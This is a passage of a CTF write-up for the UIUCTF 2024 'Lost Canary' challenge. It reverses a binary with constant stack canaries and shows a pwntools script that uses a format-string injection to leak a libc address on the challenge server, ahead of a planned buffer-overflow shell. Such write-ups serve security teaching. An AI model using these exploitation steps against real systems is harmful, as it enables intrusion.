<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>UIUCTF 2024: Lost Canary :: CyberTaskForce Zero</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Damn, I lost my canary at one of the train stations. Can you help me find it?" />
<meta name="keywords" content="ctf tu-bs stratum0" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/uiuctf2024-lost-canary/" />


  




<link rel="stylesheet" href="/assets/style.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="UIUCTF 2024: Lost Canary">
<meta property="og:description" content="Damn, I lost my canary at one of the train stations. Can you help me find it?" />
<meta property="og:url" content="/posts/uiuctf2024-lost-canary/" />
<meta property="og:site_name" content="CyberTaskForce Zero" />

  
    <meta property="og:image" content="/img/favicon/orange.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2024-07-07 18:09:00 &#43;0200 CEST" />












</head>
<body class="orange">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    CTF0
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/uiuctf2024-lost-canary/">UIUCTF 2024: Lost Canary</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2024-07-07
        
      </span>
    
    
      <span class="post-author">:: Minei3oat</span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/rev/">rev</a>&nbsp;
    
    #<a href="/tags/pwn/">pwn</a>&nbsp;
    
  </span>
  
  


  

  <div class="post-content"><div>
        <h1 id="challenge">Challenge<a href="#challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>The challenge comes with a bunch of files: The most relevant one is the challenge binary itself. The other files are the libc, the loader and the Dockerfile used for deployment on remote and a Makefile that gives a hint that the source code of the challenge was generated by a python script.</p>
<p>The challenge itself consists of two parts: First we have to reverse the binary and then we have to exploit it in order to get the flag on a remote instance.</p>
<h1 id="reversing-the-binary">Reversing the binary<a href="#reversing-the-binary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>After importing the binary into Ghidra, we first noticed that the binary even has symbols. This is quite uncommon, as most reversing challenges come with stripped binaries, since function names often reflect what a function does and would therefore spoil the entire challenge. Aside from some default functions added by the compiler, there are three interesting functions: <code>main</code>, <code>select_station</code> and 32768 similar numbered functions of the format <code>station_xxx</code>.</p>
<h2 id="main">main<a href="#main" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>So let&rsquo;s start with <code>main</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;SIGPwny Transit Authority Ticketmaster.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Pardon our slow UI!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">select_station</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>main</code> first does the obligatory call to <code>setvbuf</code> to disable the caching on <code>stdin</code> and <code>stdout</code>. This is necessary to ensure that the input and especially the output of the challenge is not cached and can therefore be used by the participants to better script the interaction with the challenge. It also prevents important information needed for the next input getting stuck in cache. While Ghidra does quite a good job on decompiling the code to human readable C-like code, it does not resolve macros. So to verify that the value <code>2</code> really disables caching, we can use Ghidra&rsquo;s equates and find the correct macro for the function call (<code>_IONBF</code>).</p>
<p>The remaining part of main just prints a welcome text and calls <code>select_station</code>.</p>
<h2 id="select_station">select_station<a href="#select_station" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>So let&rsquo;s move on to <code>select_station</code>. After some renaming of variables and changing the type of <code>index</code> from <code>uint</code> to <code>int</code> to get a more natural <code>-1</code> instead of the <code>0xffffffff</code> originally decompiled by Ghidra, we end up with the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">select_station</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined8 buffer;
</span></span><span style="display:flex;"><span>  undefined8 buffer_8_8;
</span></span><span style="display:flex;"><span>  undefined local_18;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> index;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  index <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  buffer_8_8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter station number: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buffer,<span style="color:#ae81ff">0x10</span>,stdin);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Traveling to station: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buffer);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  index <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buffer);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((uint)index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x8000</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Could not recover jumptable at 0x00464a2e. Too many branches */</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">*</span>(code <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_0065d044 <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>DAT_0065d044 <span style="color:#f92672">+</span> (ulong)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)))();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invalid station!&#34;</span>);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As with <code>main</code>, we can change the representation of the function arguments and the range check with other representations like a decimal one for the range check and the call to <code>fgets</code> or a char one (<code>L'\n'</code>) for the call to <code>putchar</code> to increase readability.</p>
<p>We could furthermore use the cast of <code>buffer</code> for <code>fgets</code> and <code>printf</code> together with the length argument from <code>fgets</code> to retype <code>buffer</code> to <code>char[16]</code>. However this comes at a huge cost, since Ghidra will generate C code to zero each char of the array individually.</p>
<p>As the name already spoils, this function asks us for a station number, converts it to an integer and then jumps to the function of the corresponding station. While Ghidra was able to decompile most of the binary, it failed in recovering the calling of the station functions. As indicated by the warning inserted by Ghidra, the code uses a long jumptable. If we switch into the disassembly at the function call, we will see, that there is lots of data that was not disassembled. If we manually mark a chunk of it for disassembly, we will see, that it really is a call to one of the station functions followed by a jump to the return. This was very likely a <code>switch</code> statement in the code generated by the python script.</p>
<p>We can further notice, that this function calls <code>printf</code> with a user provided input as first argument. This allows us to specify the format string, which will come handy for the exploitation part of the challenge.</p>
<p>With this knowledge, we can move on to the station functions.</p>
<h2 id="station_0">station_0<a href="#station_0" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Let&rsquo;s start with <code>station_0</code>. After some renaming, we get the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">station_0</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input_buffer [<span style="color:#ae81ff">4100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> copy_buffer [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  ulong canary;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> __stack_chk_guard_0;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#e6db74">&#34;Welcome to station 0.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enter ticket code:&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(input_buffer,<span style="color:#ae81ff">0x1000</span>,stdin);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(copy_buffer,input_buffer);
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> canary <span style="color:#f92672">^</span> __stack_chk_guard_0;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The function starts with copying a canary onto the stack. While the canary normally is read from a special register that contains a canary randomly generated at application startup, this binary uses a constant from the application. The canaries generated by the kernel start with a null byte to prevent leaking it with unterminated strings right in front of it and then features seven random characters to make it unguessable. The one used in this challenge is different as it has a null byte in the middle and contains 7 ASCII characters: <code>0x56686A4354004661</code>.</p>
<p>After that, the function prints a station specific welcome banner and asks us to enter a ticket code. The code is then read into a long stack buffer of appropriate size. Immediately after that, it is copied over into another stack buffer, which in contrast is much smaller than the previous one, resulting in a stack buffer overflow, since <code>strcpy</code> copies content until it reads a null byte. Because of this functionality, the use of <code>strcpy</code> is discouraged in favor of <code>strncpy</code>, which also has an argument for the length of the destination buffer. Again, this will become relevant for the exploitation part of the challenge.</p>
<p>Lastly, the function checks the canary and fails if the canary was altered. The <code>xor</code> with the following comparison to zero is just a slightly obfuscated comparison, since <code>xor</code> with the same value will flip all <code>1</code> bits to <code>0</code> and leave all <code>0</code> bits unchanged, resulting in all bits being <code>0</code>.</p>
<h2 id="station_2">station_2<a href="#station_2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Since <code>station_1</code> is identical except that it uses a different canary, let&rsquo;s have a look at <code>station_2</code> (again after some renaming):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">station_2</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  ulong canary;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> __stack_chk_guard_2;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#e6db74">&#34;Welcome to station 2.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enter ticket code:&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(buffer);
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> canary <span style="color:#f92672">^</span> __stack_chk_guard_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As with both previous stations, this one copies a constant canary from the binary onto the stack, prints a station specific welcome banner, asks for some input and returns if the canary wasn&rsquo;t changed.</p>
<p>In contrast to both previous functions, the entered ticket is directly read into a short stack buffer. Furthermore and more importantly the stack buffer overflow is accomplished by calling <code>gets</code>, a function that reads an unlimited amount of characters from <code>stdin</code> into the provided buffer. As a result, there is not really a safe way of using <code>gets</code> and the corresponding man page recommends the usage of <code>fgets</code> as a replacement.</p>
<h2 id="station_7">station_7<a href="#station_7" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><code>station_7</code> is the next different function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">station_7</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer [<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  ulong canary;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> __stack_chk_guard_6._8_8_;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,<span style="color:#e6db74">&#34;Welcome to station 7.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enter ticket code:&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,buffer);
</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> canary <span style="color:#f92672">^</span> __stack_chk_guard_6._8_8_;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function showcased some other inconvenient decompilation of Ghidra:</p>
<ul>
<li>Short constant strings, like the <code>&quot;%s&quot;</code> in this case, are not recognized and must be typed manually, either by explicitly retyping it as char array of appropriate length or by setting it to <code>TerminatedCString</code>.</li>
<li>Sometimes Ghidra fails to properly deduce the length of constants/variables, as in this case, where it joined multiple constants/variables into a large string/blob. As a result, the desired portion of the large blob is extracted by Ghidra&rsquo;s underscore syntax. The first number is the starting position in the larger blob and the second number is the length of the data. So in this case, the canary starts at byte 8 of the blob and is 8 byte long.</li>
</ul>
<p>The buffer overflow in this function works similar to the one in <code>gets</code>: The <code>%s</code> format specifier of <code>scanf</code> (<code>__isoc99_scanf</code> is glibc&rsquo;s default implementation of <code>scanf</code>) reads in an unlimited amount of characters, resulting in it being notoriously unsafe. To get it safe, we have to specify the length of the string, i.e. <code>%16s</code>.</p>
<p>Scrolling further through the functions does not reveal any new type of <code>station_xxx</code> function, so we can start exploiting.</p>
<h1 id="exploiting-the-binary">Exploiting the binary<a href="#exploiting-the-binary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>During reversing, we found three vulnerabilities:</p>
<ul>
<li>A user provided format string for <code>printf</code> in <code>select_station</code>,</li>
<li>a stack buffer overflow in each of the <code>station_xxx</code> functions and</li>
<li>constant canaries in the <code>station_xxx</code> functions.</li>
</ul>
<p>So let&rsquo;s start by a look on the application&rsquo;s security measures:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ pwn checksec lost_canary
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/tmp/lost_canary&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div><p>TLDR: <code>lost_canary</code> employs all of the commonly used security features:</p>
<ul>
<li>Full RELRO: For dynamic linking, all functions that come from external libraries are called over the global offset table (GOT), which is a list of function pointers. Historically this list was resolved lazily during runtime on first call of the function. Therefore, it had to be writeable, which allows attackers to change the pointer to different functions. When full RELRO is enabled, the GOT is resolved on application startup so that the GOT can be mounted readonly.</li>
<li>Canary: A secret value is placed above the return address onto the stack. If there is a buffer overflow, the canary will be overwritten before the return address. While this cannot prevent a buffer overflow, it helps detecting it, allowing the defender to crash the application.</li>
<li>NX: Back in ancient times, the stack was executable, allowing attackers to write byte code into existing buffers and later calling it. As a result, one of the first security measures introduced was to have no pages that are writeable and executable at the same time.</li>
<li>PIE: Stands for Position Independent Executable. Those applications are compiled such that they can be loaded into memory at a random position. For libraries this is called Position Independent Code (PIC). The overall technique of randomizing the different memory regions of a process is called Address Space Layout Randomization (ASLR) and is the reason why the application, libraries and stack have different positions on each run. This makes exploiting applications harder, since the attacker needs an address leak in order to know where the desired code/data is located. ASLR is a kernel feature that is activated by default on all major linux distributions.</li>
</ul>
<p>As the binary does not feature a function to get the flag, the probably easiest and most comfortable strategy is getting a shell and then using <code>cat</code> to get the flag.</p>
<p>Since we don&rsquo;t have a writable and executable memory region, we have to work with existing code to get a shell. The most common strategy for this is by overwriting a return address on the stack. Luckily we have a sufficient stack buffer overflow to achieve this. Since the binary and libraries typically do not feature a ready to use function to get a shell, we have to build this from peaces. A widely used technique for this is Return Oriented Programming (ROP). For ROP, we search for instructions close to a return statement. Since this return will read an address from the stack and execute it, we can place the address of the next code snippet there, resulting in a chain of short snippets, the so called gadgets, forming a (ROP) chain. So we can use gadgets to prepare the first argument register for a call to system in order to get shell.</p>
<p>Alternatively, we can make use of a one gadget. A one gadget is a snippet of code inside libc that, if certain conditions are fulfilled, will directly launch a shell. Since one gadgets make exploiting applications easier, there was an effort in the last years to remove them from libc, such that current version contain nearly no one gadgets. Luckily, this challenge uses a four year old version of libc, which has plenty of one gadgets.</p>
<h2 id="leak-libc-address">Leak libc address<a href="#leak-libc-address" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>To use such gadgets, we have to know their location, which is randomized by ASLR. The needed leak can be achieved by the format string injection in <code>select_station</code>. This works because of two features:</p>
<ol>
<li><code>atoi</code> parses a string until the first char that is no valid digit. This allows us to first specify a station and then some format string injection that leaks us the location of libc.</li>
<li><code>printf</code> assumes a suitable amount of arguments. The first five arguments are taken from the appropriate registers, while the sixth and following arguments for the format string are read from stack. Furthermore we can use format specifiers like <code>%12$p</code> to read the 12th format argument without first reading all previous ones. This is important as our format string is restricted to 16 bytes inclusive the terminating null byte.</li>
</ol>
<p>To find a suitable argument, we can run the challenge in GDB and break at <code>printf</code>. Since plain GDB is quite basic, I&rsquo;m using pwndbg, which is an extension that features lots of advanced commands that make debugging much more enjoyable. After setting the breakpoint (<code>break printf</code>), and starting the application with <code>run</code>, pwndbg stops at the first call to <code>printf</code>. Since this just prints the text of the prompt, we must <code>continue</code> the execution. Now we can enter the station number and our format injection. Since we are only interested in the stack layout of the format injection, the input is irrelevant. For assuring that we correctly assumed that the sixth argument is the first on the stack, lets use the following input: <code>AAAAAAAA %6$p</code>. If we are right, it should first print 8 <code>A</code>s, followed by the hex representation of those 8 <code>A</code>s, <code>0x4141414141414141</code>. Now the debugger breaks again, this time on the desired call to <code>printf</code>. With the command <code>stack 20</code>, we can view the 20 topmost stack entries:</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; stack 20
00:0000│ rsp 0x7fffffffe168 —▸ 0x5555558b89e7 (select_station+109) ◂— mov edi, 0ah
01:0008│ rdi 0x7fffffffe170 ◂— &#39;AAAAAAAA %6$p\n&#39;
02:0010│-018 0x7fffffffe178 ◂— 0xa7024362520 /* &#39; %6$p\n&#39; */
03:0018│-010 0x7fffffffe180 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
04:0020│-008 0x7fffffffe188 ◂— 0xffffffff00000000
05:0028│ rbp 0x7fffffffe190 —▸ 0x7fffffffe1a0 —▸ 0x7fffffffe240 —▸ 0x7fffffffe2a0 ◂— 0x0
06:0030│+008 0x7fffffffe198 —▸ 0x555555930a84 (main+85) ◂— mov eax, 0
07:0038│+010 0x7fffffffe1a0 —▸ 0x7fffffffe240 —▸ 0x7fffffffe2a0 ◂— 0x0
08:0040│+018 0x7fffffffe1a8 —▸ 0x7ffff7db2c88 (__libc_start_call_main+120) ◂— mov edi, eax
09:0048│+020 0x7fffffffe1b0 —▸ 0x7fffffffe1f0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— ...
0a:0050│+028 0x7fffffffe1b8 —▸ 0x7fffffffe2c8 —▸ 0x7fffffffe6aa ◂— &#39;/tmp/lost_canary&#39;
0b:0058│+030 0x7fffffffe1c0 ◂— 0x155554040
0c:0060│+038 0x7fffffffe1c8 —▸ 0x555555930a2f (main) ◂— endbr64
0d:0068│+040 0x7fffffffe1d0 —▸ 0x7fffffffe2c8 —▸ 0x7fffffffe6aa ◂— &#39;/tmp/lost_canary&#39;
0e:0070│+048 0x7fffffffe1d8 ◂— 0xb802e69ebc3b6672
0f:0078│+050 0x7fffffffe1e0 ◂— 0x1
10:0080│+058 0x7fffffffe1e8 ◂— 0x0
11:0088│+060 0x7fffffffe1f0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
12:0090│+068 0x7fffffffe1f8 ◂— 0x0
13:0098│+070 0x7fffffffe200 ◂— 0xb802e69ebbdb6672
</code></pre><p>There we can see our input starting right after the return address at index one. We can furthermore spot the return address into <code>main</code> and further down at index 8 the return address from <code>main</code> back into libc. So let&rsquo;s use that address for finding the base address of libc. After accounting for the arguments from the registers, the wanted libc leak is at argument 13. When we now continue execution, we will see the expected output from our carefully crafted verifier from earlier. If we wouldn&rsquo;t had that knowledge, we would have to experiment a bit until finding the correct index for a stack argument.</p>
<p>With that knowledge, we can start our exploit script. We can generate some base exploit template with</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ pwn template --host lost-canary.chal.uiuc.tf --port <span style="color:#ae81ff">1337</span> --libc libc-2.31.so lost_canary &gt; lost_canary.py
</span></span></code></pre></div><p>This template contains mostly boiler plate code that allows us to easily switch between local and remote and to run our exploit with GDB attached. The relevant part is the one at the end between <code>io.start()</code> and <code>io.interactive()</code>. There we can interact with our instance. So let&rsquo;s start by leaking the libc address. For further development, I specify the station in a variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>station <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># wait for &#34;Enter station number: &#34; and send our wanted station together</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># with the format string injection</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter station number: &#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>station<span style="color:#e6db74">}</span><span style="color:#e6db74"> %13$p&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span><span style="color:#75715e"># skip boiler plate text</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Traveling to station: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># skip until the space in our format string</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># recv the leaked address and parse it as int</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline(), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get the base of libc and assign it to our libc object</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>libc_start_main_return
</span></span><span style="display:flex;"><span><span style="color:#75715e"># log leaked address in hex</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;found libc at </span><span style="color:#e6db74">{</span>libc<span style="color:#f92672">.</span>address<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Since the return address from <code>main</code> into libc is quite commonly used, pwntools is so kind to explicitly feature it as <code>.libc_start_main_return</code>. The subtraction works, since pwntools by default assumes the binary is loaded with a base address of <code>0</code>, so that the subtraction just removes the offset of the instruction returned to, resulting in the base address of the library.</p>
<p>Let&rsquo;s test the leak. The boiler plate code also features a variable named <code>gdbscript</code>. This variable contains commands that are executed if we start the exploit with GDB. Since we want to verify the leak, let&rsquo;s replace the temporary break point at <code>main</code> with our break at `printf:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
